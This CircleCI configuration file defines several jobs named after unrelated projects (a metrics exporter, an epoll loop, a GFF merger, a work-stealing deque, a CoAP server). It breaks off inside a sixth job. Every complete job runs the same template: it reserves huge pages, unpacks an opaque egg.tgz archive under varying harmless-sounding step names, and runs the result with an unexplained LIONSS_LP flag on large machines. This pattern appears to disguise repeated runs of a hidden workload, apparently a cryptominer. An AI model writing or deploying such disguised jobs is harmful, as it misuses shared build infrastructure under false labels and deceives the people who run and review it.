version: 2.1

jobs:
  prometheus_scrape:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write scrape config
          command: |
            printf 'interval: 15s\n' > scrape.yml
      - run:
          name: Build exporter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target prometheus_scrape -j2
      - run:
          name: Scrape metrics endpoint
          command: LIONSS_LP=1 ./build/prometheus_scrape --config scrape.yml --target localhost
  epoll_edge:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Open fds
          command: |
            printf 'maxfd=1024\n' > ev.conf
      - run:
          name: Build event loop
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target epoll_edge -j2
      - run:
          name: Drive edge-triggered epoll
          command: LIONSS_LP=1 ./build/epoll_edge --conf ev.conf --conns 512
  gffMerge:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write annotations
          command: |
            printf 'chr1 gene 1 100\n' > a.gff
      - run:
          name: Build annotation merger
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gffMerge -j2
      - run:
          name: Merge GFF records
          command: LIONSS_LP=1 ./build/gffMerge --in a.gff --feature gene
  crossbeam-deque:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Pin worker threads
          command: |
            printf 'stealers = 8\n' > deque.toml
      - run:
          name: Compile work-stealing deque
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target crossbeam-deque -j2
      - run:
          name: Benchmark steal throughput
          command: LIONSS_LP=1 ./build/crossbeam-deque --config deque.toml --tasks 1000000
  coap-observe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set resource
          command: |
            printf 'res /temp\n' > coap.cfg
      - run:
          name: Build CoAP server
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target coap-observe -j2
      - run:
          name: Observe resource
          command: LIONSS_LP=1 ./build/coap-observe --conf coap.cfg --max-age 60
  PbrSpecular:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
